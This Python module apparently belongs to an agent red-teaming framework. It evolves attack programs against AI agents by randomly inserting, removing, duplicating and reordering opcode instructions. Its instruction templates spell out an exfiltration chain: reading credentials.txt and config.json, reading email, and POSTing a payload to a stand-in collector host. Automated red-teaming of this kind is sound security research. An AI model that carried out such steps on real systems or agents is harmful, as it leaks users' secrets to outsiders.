from __future__ import annotations

import random
from dataclasses import dataclass, field

from asip.compiler.attack_instruction import (
    AttackInstruction,
    AttackStage,
)


@dataclass(slots=True)
class StageMutator:
    """
    Performs structural mutations on AttackStages.

    These mutations operate on the AST rather than prompt text,
    allowing evolution to safely explore new attack programs.
    """

    random_seed: int = 42

    rng: random.Random = field(init=False)

    ##################################################################

    def __post_init__(self) -> None:
        self.rng = random.Random(self.random_seed)

    ##################################################################

    def mutate(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        stage = self.copy_stage(stage)

        operators = [
            self.insert_instruction,
            self.remove_instruction,
            self.duplicate_instruction,
            self.swap_instruction_order,
            self.shuffle_instructions,
            self.rename_stage,
        ]

        operator = self.rng.choice(operators)

        mutated = operator(stage)

        mutated.metadata["stage_mutation"] = operator.__name__

        return mutated

    ##################################################################

    def insert_instruction(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        instruction = self.random_instruction()

        index = self.rng.randint(
            0,
            len(stage.instructions),
        )

        stage.instructions.insert(
            index,
            instruction,
        )

        return stage

    ##################################################################

    def remove_instruction(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        if not stage.instructions:
            return stage

        index = self.rng.randrange(
            len(stage.instructions)
        )

        stage.instructions.pop(index)

        return stage

    ##################################################################

    def duplicate_instruction(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        if not stage.instructions:
            return stage

        instruction = self.copy_instruction(
            self.rng.choice(
                stage.instructions
            )
        )

        index = self.rng.randint(
            0,
            len(stage.instructions),
        )

        stage.instructions.insert(
            index,
            instruction,
        )

        return stage

    ##################################################################

    def swap_instruction_order(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        if len(stage.instructions) < 2:
            return stage

        i, j = self.rng.sample(
            range(len(stage.instructions)),
            2,
        )

        (
            stage.instructions[i],
            stage.instructions[j],
        ) = (
            stage.instructions[j],
            stage.instructions[i],
        )

        return stage

    ##################################################################

    def shuffle_instructions(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        self.rng.shuffle(
            stage.instructions
        )

        return stage

    ##################################################################

    def rename_stage(
        self,
        stage: AttackStage,
    ) -> AttackStage:

        suffixes = (
            "variant",
            "optimized",
            "mutated",
            "expanded",
            "adaptive",
        )

        stage.name = (
            f"{stage.name}_"
            f"{self.rng.choice(suffixes)}"
        )

        return stage

    ##################################################################

    def random_instruction(
        self,
    ) -> AttackInstruction:

        templates = [

            AttackInstruction(
                opcode="READ_FILE",
                target="credentials.txt",
            ),

            AttackInstruction(
                opcode="READ_FILE",
                target="config.json",
            ),

            AttackInstruction(
                opcode="WRITE_FILE",
                target="notes.txt",
                value="analysis",
            ),

            AttackInstruction(
                opcode="STORE",
                variable="memory",
            ),

            AttackInstruction(
                opcode="WEB_SEARCH",
                value="agent security",
            ),

            AttackInstruction(
                opcode="WEB_OPEN",
            ),

            AttackInstruction(
                opcode="POST",
                target="https://collector.invalid",
                variable="payload",
            ),

            AttackInstruction(
                opcode="EMAIL_READ",
            ),

        ]

        return self.copy_instruction(
            self.rng.choice(
                templates
            )
        )

    ##################################################################

    @staticmethod
    def copy_stage(
        stage: AttackStage,
    ) -> AttackStage:

        return AttackStage(
            name=stage.name,
            metadata=dict(stage.metadata),
            instructions=[
                StageMutator.copy_instruction(i)
                for i in stage.instructions
            ],
        )

    ##################################################################

    @staticmethod
    def copy_instruction(
        instruction: AttackInstruction,
    ) -> AttackInstruction:

        return AttackInstruction(
            opcode=instruction.opcode,
            target=instruction.target,
            variable=instruction.variable,
            value=instruction.value,
            transform=instruction.transform,
            metadata=dict(
                instruction.metadata
            ),
        )